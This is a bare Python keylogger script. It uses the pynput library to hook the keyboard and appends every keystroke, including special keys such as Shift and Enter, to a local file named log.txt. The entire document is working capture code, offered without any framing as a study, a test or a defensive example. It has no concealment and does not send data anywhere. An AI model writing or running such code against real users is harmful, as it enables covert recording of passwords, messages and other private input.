from pynput.keyboard import Listener

log_file = "log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:  # Special keys (e.g., Shift, Enter, Backspace)
        with open(log_file, "a") as f:
            f.write(f" {key} ")

def main():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()

